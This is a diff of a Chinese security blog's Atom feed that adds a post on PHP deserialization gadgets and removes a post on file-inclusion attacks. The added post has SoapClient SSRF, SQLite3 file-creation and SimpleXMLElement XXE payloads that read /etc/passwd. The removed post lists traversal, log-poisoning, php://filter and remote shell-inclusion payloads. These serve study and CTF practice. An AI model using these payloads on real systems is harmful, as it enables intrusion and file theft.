@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-08-31T13:49:49.341Z</updated>
+  <updated>2019-09-01T07:14:51.120Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PHP反序列化原生类魔术方法的利用</title>
+    <link href="http://yoursite.com/2019/09/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8/"/>
+    <id>http://yoursite.com/2019/09/01/PHP反序列化原生类魔术方法的利用/</id>
+    <published>2019-09-01T07:14:51.000Z</published>
+    <updated>2019-09-01T07:14:51.120Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>方法：call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$target = &apos;http://127.0.0.1/flag.php&apos;;</span><br><span class="line">$a = new SoapClient(null, array(&apos;location&apos; =&gt; $target,</span><br><span class="line">&apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; .</span><br><span class="line">&quot;Cookie:PHPSESSID=2r4kt8t9l0c6hhq67e1bs4th90&quot;,</span><br><span class="line">&apos;uri&apos; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure></p><p>通过调用SoapClient类的<code>__call</code>方法可以触发ssrf攻击。<br><img src="/img/1567317309843.png" alt=""><br>通过抓包可以看到，本地127.0.0.1对自身发起了请求，并且SoapClient可以对header部分进行修改，可以实现SSRF攻击。</p><h2 id="SQLite3"><a href="#SQLite3" class="headerlink" title="SQLite3"></a>SQLite3</h2><p>方法：construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sky=new SQLite3(&apos;/tmp/sky/evil.php&apos;);</span><br></pre></td></tr></table></figure></p><p>通过SQLite3的<code>__construct</code>方法可以创建任意空白文件，怎么触发<code>__construct</code>我也不太清楚。</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p>方法：toString、construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dir = new DirectoryIterator(&apos;/tmp/sky/&apos;);</span><br><span class="line">foreach ($dir as $fileinfo) &#123;</span><br><span class="line">echo $fileinfo.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>方法：toString、construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xml = new SimpleXMLElement(&apos;&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;shit;&lt;/root&gt;&apos;,LIBXML_NOENT);</span><br><span class="line">echo $xml;</span><br></pre></td></tr></table></figure></p><p>LIBXML_NOENT模式可以触发xml漏洞，echo可以进行回显</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>上述了多个原生类的利用点，实际上他们都来自于一场真实的案例，原文如下：<br><a href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html" target="_blank" rel="noopener">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html</a><br>该牛串联多个原生类序列化问题，最后成功对某知名网站的任意代码执行，有兴趣的可以好好拜读一下~</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/#SimpleXMLElement" target="_blank" rel="noopener">https://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/#SimpleXMLElement</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;SoapClient&quot;&gt;&lt;a href=&quot;#SoapClient&quot; class=&quot;headerlink&quot; title=&quot;SoapClient&quot;&gt;&lt;/a&gt;SoapClient&lt;/h2&gt;&lt;p&gt;方法：call&lt;br&gt;&lt;figure class=&quot;highlight pl
+      
+    
+    </summary>
+    
+      <category term="web" scheme="http://yoursite.com/categories/web/"/>
+    
+    
+      <category term="other" scheme="http://yoursite.com/tags/other/"/>
+    
+  </entry>
   
   <entry>
     <title>2018-Xctf Final &amp; bestphp-revenge</title>
@@ -485,31 +510,6 @@
       
       
         &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01.前言&quot;&gt;&lt;/a&gt;0x01.前言&lt;/h2&gt;&lt;p&gt;做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。&lt;br&gt;影
-      
-    
-    </summary>
-    
-      <category term="web" scheme="http://yoursite.com/categories/web/"/>
-    
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>文件包含漏洞小结</title>
-    <link href="http://yoursite.com/2019/03/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://yoursite.com/2019/03/31/文件包含漏洞/</id>
-    <published>2019-03-31T10:32:18.000Z</published>
-    <updated>2019-05-13T12:45:50.095Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见函数有：include()、require()<br>区别：</p><ol><li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li><li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ol><li><p>包含目录文件<br>?file=test.txt<br>如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</p><p> ?file=./../../test.txt<br> <code>./</code>当前目录，<code>../</code>上一级目录，这样的遍历目录来读取文件</p></li><li><p>包含日志文件<br>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录<br>常见几个路径<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br><img src="/img/1553776213389.png" alt="Alt text"></p></li><li><p>包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p></li><li><p>利用php流filter(过滤器，可以用来读取php文件内容，不需要开启allow_url_include)<br>?file=php://filter/convert.base64-encode/resource=index.php</p></li></ol><h2 id="本地文件包含小姿势"><a href="#本地文件包含小姿势" class="headerlink" title="本地文件包含小姿势"></a>本地文件包含小姿势</h2><p>审计中可以见这样的包含模板文件：<br><code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;</code></p><ol><li>%00截断<br> /etc/passwd%00<br> （需要magic_quotes_gpc=off，PHP小于5.3.4有效）</li></ol><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ol><li>远程代码执行<br>?file=[http|https|ftp]://example.com/shell.txt<br>(需要allow_url_fopen=On并且 allow_url_include=On)</li><li>利用php流input(接收POST过来的值)<br>?file=php://input<br>(需要allow_url_include=On)</li><li>利用data URIs<br>?file=data://text/plain;base64,base64编码的payload<br>(需要allow_url_include=On)</li></ol><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ol><li>phar伪协议<br>?file=phar://test.jpg/test.php<br>利用方法，先新建一个php文件，然后在php文件中写入phpinfo，然后进行压缩为zip文件，重命名为jpg文件，然后进行phar包含</li><li>zip伪协议<br>?file=zip://C:/www/K4ge/CodeAduit/1000/include/test.jpg%23test.php<br>必须使用绝对路径</li></ol>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。&lt;br&gt;常见函数
       
     
     </summary>
